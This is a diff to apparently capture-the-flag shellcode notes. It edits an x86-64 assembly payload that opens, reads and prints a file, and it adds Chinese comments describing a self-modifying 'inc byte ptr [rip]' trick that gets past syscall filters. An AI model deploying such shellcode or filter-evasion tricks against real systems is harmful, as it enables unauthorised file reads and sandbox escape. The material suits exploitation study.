@@ -198,11 +198,13 @@ objcopy --dump-section .text=shellcode.raw shellcode.elf
 .global _start
 _start:
 .intel_syntax noprefix
-.fill 0x800, 1, 0x90 # fill with nop
+#.fill 0x800, 1, 0x90 # fill with nop
         mov rax, 2 # sys_create
         lea rdi, [rip+file_name] # file_name
         mov rsi, 2 # O_RDWR
         syscall
+        #inc byte ptr [rip] 如果有syscall/int 80/sysenter的限制，而且你代码所在位置是可写的话，可以用这种方法规避
+        #.word 0x050e
         lea rdi, [rip+file_fd]
         mov [rdi], eax
 
@@ -211,12 +213,16 @@ _start:
         lea rsi, [rip+buffer]
         mov edx, [rip+buffer_len]
         syscall
+        #inc byte ptr [rip] 如果有syscall/int 80/sysenter的限制，而且你代码所在位置是可写的话，可以用这种方法规避
+        #.word 0x050e
 
         mov rax, 1 # sys_write
         mov rdi, 1 # stdout
         lea rsi, [rip+buffer]
         mov edx, [rip+buffer_len]
         syscall
+        #inc byte ptr [rip] 如果有syscall/int 80/sysenter的限制，而且你代码所在位置是可写的话，可以用这种方法规避
+        #.word 0x050e
 binsh:
         .string "/bin/sh"
 file_name:
